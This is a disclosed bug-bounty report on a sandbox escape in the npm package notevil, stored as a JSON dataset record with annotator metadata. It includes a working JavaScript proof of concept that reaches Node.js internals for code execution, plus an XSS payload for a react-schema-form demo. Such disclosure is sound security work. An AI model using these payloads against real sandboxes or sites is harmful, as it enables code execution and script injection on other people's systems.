{
  "reported_to": "Node.js third-party modules",
  "reported_by": "phra ",
  "title": "[notevil] - Sandbox Escape Lead to RCE on Node.js and XSS in the Browser",
  "content": "\nI would like to report a sandbox escape / code injection vulnerability in notevil.\nIt allows an attacker to escape the intended sandbox and execute javascript code in the global context, meaning that he/she can achieve arbitrary command execution (RCE) when running in nodejs and cross site scripting (XSS) when running in the browser.\nModule\nmodule name: notevail\nversion: 1.3.2\nnpm page: https://www.npmjs.com/package/notevil\nModule Description\nEvalulate javascript like the built-in javascript eval() method but safely.\nThis module uses esprima to parse the javascript AST then walks each node and evaluates the result.\nLike built-in eval, the result of the last expression will be returned. Unlike built-in, there is no access to global objects, only the context that is passed in as the second object.\nBuilt in types such as Object and String are still available, but they are wrapped so that any changes to prototypes are contained in the eval instance.\nModule Stats\n[1] weekly downloads: 3,290\nVulnerability\nVulnerability Description\nA bypass to a previous sandbox escape fix (https://github.com/mmckegg/notevil/commit/5974329712f0a527c5e16d3b9067a076e28e45f1) is existing and proven by the attached poc.\nSteps To Reproduce:\nNode.js\nCode 501 Bytes\n1var safeEval = require(\"notevil\")\n2\n3var code = \"\" +\n4    \"function fn() {};\" +\n5    \"var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;\" +\n6    \"var properties = Object.values(constructorProperty);\" +\n7    \"properties.pop();\" +\n8    \"properties.pop();\" +\n9    \"properties.pop();\" +\n10    \"var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();\" +\n11    \"(Func())()\"\n12console.log(safeEval(code))\ncheck the provided poc:\nhttp://runkit.com/phra/notevil---sandbox-escape\nBrowser\nIf we check some dependent package, such as react-schema-form, we can see that the issue lead to XSS when the affected package is used in the browser.\nvisit https://networknt.github.io/react-schema-form/\nset form\nCode 541 Bytes\n1[\n2  {\n3    \"key\": \"comments\",\n4    \"condition\": \"function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()\",\n5    \"type\": \"radios\",\n6    \"titleMap\": [\n7      {\n8        \"value\": \"S\",\n9        \"name\": \"Shipping\"\n10      },\n11      {\n12        \"value\": \"P\",\n13        \"name\": \"Pickup\"\n14      }\n15    ]\n16  }\n17]\nset schema\nCode 58 Bytes\n1{\n2  \"type\": \"object\",\n3  \"required\": [\n4    \"comments\"\n5  ]\n6}\nPatch\nTBD\nSupporting Material/References:\nnot applicable.\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nAn attacker can execute arbitrary commands on the system when the package is used with nodejs and execute arbitrary javascript when is used in the browser.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1598559240,
  "report_url": "https://hackerone.com/reports/809012",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the 'notevil' package (version 1.3.2) in a Node.js environment."
    ],
    [
      2,
      "Execute the provided PoC code to escape the sandbox and achieve RCE or XSS."
    ]
  ],
  "vuln_description": "The vulnerability is a sandbox escape in the 'notevil' package that allows an attacker to execute arbitrary JavaScript code in the global context. This leads to Remote Code Execution (RCE) in Node.js and Cross-Site Scripting (XSS) in the browser.",
  "reason": "The attack involves manipulating JavaScript prototypes and constructor properties in a non-obvious way to bypass the sandbox. It requires deep understanding of JavaScript internals and the specific implementation of the 'notevil' sandbox.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves a sandbox escape and code injection within the 'notevil' module, which is not related to authentication or authorization bypasses. The proposed methodologies focus on IDOR and AuthN/AuthZ bypasses by manipulating user sessions and resource IDs, which are not applicable to this type of vulnerability.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves a complex JavaScript sandbox escape using prototype manipulation and function rebinding - a payload that requires deep understanding of JS internals and multi-step exploitation. The methodology's 'simple payload' approach focuses on generic/common payload permutations without custom filter bypasses. The PoC's constructor property chaining and Function.bind() exploitation would not be covered by basic encoding or context positioning payloads. While the XSS trigger in the browser example could theoretically be detected through stored injection analysis, the payload's complexity and dependency on specific JS engine behaviors make it unlikely to be found through standard 'simple payload' testing.",
    "is_simple_injection": false
  }
}